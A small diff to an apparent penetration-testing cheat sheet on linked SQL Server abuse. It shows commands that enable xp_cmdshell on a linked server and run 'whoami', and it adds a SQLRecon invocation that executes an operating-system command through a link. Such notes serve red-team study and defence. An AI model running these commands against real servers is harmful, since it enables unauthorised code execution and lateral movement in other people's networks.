@@ -55,3 +55,9 @@ EXECUTE ('EXEC sp_configure ''xp_cmdshell'', 1') at [SQLSERVER2];
 EXECUTE ('RECONFIGURE') at [SQLSERVER2] ;
 EXECUTE ('EXEC master..xp_cmdshell ''whoami''') at [SQLSERVER2] ;
 ```
+
+## Using SQLRecon Tools with link
+
+```
+.\SQLRecon.exe /a:WinToken /h:127.0.0.1 /l:xxx.xxx.local /m:lXpCmd /c:'command'
+```
